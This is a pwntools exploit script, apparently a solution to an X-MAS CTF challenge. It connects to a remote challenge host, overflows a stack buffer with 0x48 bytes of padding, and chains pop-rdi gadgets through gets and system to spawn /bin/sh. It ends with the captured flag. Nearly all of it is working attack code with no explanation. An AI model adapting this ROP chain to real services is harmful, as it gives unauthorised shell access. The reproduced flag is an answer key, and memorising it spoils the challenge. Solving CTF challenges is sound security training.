from pwn import *
elf = ELF('./chall', checksec=False)


p = remote('challs.xmas.htsp.ro', 2001)
#p = elf.process()
payload = b''.join([
    # padding $rsp to return address
    b'A'*0x48,

    # pop rdi; ret
    p64(0x00000000004008e3), p64(elf.bss()+0x100),
    p64(elf.plt['gets']),

    # pop rdi; ret
    p64(0x00000000004008e3), p64(elf.bss()+0x100),
    p64(elf.plt['system']),
])

p.sendlineafter('Christmas?', payload)
p.sendline('/bin/sh\x00') # goes bss
p.interactive()
# X-MAS{l00ks_lik3_y0u_4re_r3ady}